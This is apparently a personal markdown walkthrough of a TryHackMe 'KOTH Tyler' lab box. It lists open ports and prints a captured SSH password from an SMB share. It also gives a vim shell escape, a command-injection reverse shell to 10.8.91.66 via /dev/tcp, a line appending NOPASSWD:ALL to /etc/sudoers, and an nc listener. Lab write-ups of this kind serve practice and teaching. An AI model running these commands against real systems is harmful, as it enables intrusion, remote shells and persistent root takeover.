# KOTH TYLER

----------------
## IP: `10.10.243.130`<br />

----------------
### Open Ports -<br/>

```
22
80
139
445
3306
5000
8080
```

<!-- ![image](/home/h00dy/Pictures/Screenshots/2022-07-26_21-55.png) -->

image.png

##### Initial access -<br/> 

![image](image.png)

```
smbclient //tyler.thm/public
```

> we can get narrator's ssh password from here<br/>

username: narrator<br/>
password: X8JEETQmf3hkS65f<br/>

##### Privilege escalation of user `narrator`

```
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

### subdirectory - `betatest`

`tdurden;bash -i >& /dev/tcp/10.8.91.66/8888 0>&1`

> Same Priv-Esc as of narrator using vim <br/>

##### To get full root access -

```
echo "tdurden ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
```

Then just do, `sudo bash` voilà you're root<br/>

##### Upload a `python` rev-shell on PORT `5000`

`http://tyler.thm:5000`<br/>

```
nc -lnvp <port>
```

![image](image.png)
